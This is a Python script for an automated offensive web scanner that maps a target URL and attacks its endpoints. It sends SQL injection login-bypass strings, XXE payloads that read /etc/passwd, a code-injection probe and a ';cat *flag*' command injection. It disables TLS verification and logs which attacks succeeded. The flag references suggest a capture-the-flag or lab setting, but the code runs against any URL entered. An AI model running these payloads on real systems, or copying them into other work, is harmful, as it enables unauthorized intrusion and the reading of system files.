import os
import json
import requests
import urllib3
from core.net_mapper import run_mapping

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TargetScanAgent:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": "AgenticScanner/4.0 (OffensiveFramework)"})

    def execute_smart_fuzzing(self, endpoints):
        print("\n[Agent] Executing multi-vector exploit validation & payload mutation on discovered assets...")
        
        final_state = []
        
        # XXE payloads
        xxe_payloads = [
            ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'),
            ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><search><query>&xxe;</query></search>')
        ]

        for ep in endpoints:
            url = ep["target"]
            path = url.replace(self.base_url, "")
            method = ep.get("method", "GET").upper()
            
            vuln_status = ep.get("vulnerability", "API Endpoint")
            status_tag = ep.get("status", "Discovered")

            # 1. Test SQLi on POST/PUT or authentication routes
            if "tokens" in path or "search" in path or "user" in path or "auth" in path:
                try:
                    sqli_data = {"username": "admin1' OR '1'='1 -- ", "query": "' OR '1'='1 -- "}
                    r = self.session.post(url, json=sqli_data, timeout=3)
                    if r.status_code == 200 and ("token" in r.text.lower() or "admin" in r.text.lower() or "result" in r.text.lower()):
                        vuln_status = "SQL Injection (Validated)"
                        status_tag = "Validated"
                        method = "POST"
                        print(f"    [+] [SUCCESS] SQLi validated at {url}")
                except Exception:
                    pass

            # 2. Test XXE on data-processing routes
            if "search" in path or "widget" in path or "user" in path or "xml" in path:
                for xxe in xxe_payloads:
                    try:
                        headers = {"Content-Type": "application/xml"}
                        r = self.session.post(url, data=xxe, headers=headers, timeout=3)
                        if r.status_code == 200 and ("root:x:" in r.text or "bin:x:" in r.text):
                            vuln_status = "XML External Entity (Validated)"
                            status_tag = "Validated"
                            method = "POST"
                            print(f"    [+] [SUCCESS] XXE validated at {url}")
                            break
                    except Exception:
                        pass

            # 3. Test GET Injections
            if "eval" in path:
                try:
                    r = self.session.get(f"{url}?s=id", timeout=3)
                    if r.status_code == 200 and "root" in r.text:
                        vuln_status = "Python Code Injection (Validated)"
                        status_tag = "Validated"
                        print(f"    [+] [SUCCESS] Code Injection validated at {url}")
                except Exception:
                    pass
            elif "uptime" in path or "flag" in path:
                try:
                    r = self.session.get(f"{self.base_url}/uptime/;cat%20*flag*", timeout=3)
                    if r.status_code == 200 and "output" in r.text:
                        vuln_status = "OS Command Injection (Validated)"
                        status_tag = "Validated"
                        print(f"    [+] [SUCCESS] Command Injection validated at {url}")
                except Exception:
                    pass

            final_state.append({
                "target": url,
                "method": method,
                "vulnerability": vuln_status,
                "status": status_tag
            })

        return final_state

def scan_target(base_url, output_file="scan_results.json"):
    print(f"\n[*] STARTING COMPREHENSIVE NETWORK MAPPING & AGENTIC SCAN")
    # Phase 1: Full Network Port & Recursive Spider Mapping
    raw_endpoints = run_mapping(base_url)
    
    # Phase 2: Agentic Exploit Fuzzing & Validation
    agent = TargetScanAgent(base_url)
    analyzed_endpoints = agent.execute_smart_fuzzing(raw_endpoints)
    
    with open(output_file, "w") as f:
        json.dump(analyzed_endpoints, f, indent=4)
        
    print(f"\n[+] Comprehensive scan complete. State saved to {output_file} ({len(analyzed_endpoints)} routes mapped).")
    return analyzed_endpoints

if __name__ == "__main__":
    target = input("Enter target URL for Agent Scanner: ").strip()
    scan_target(target)
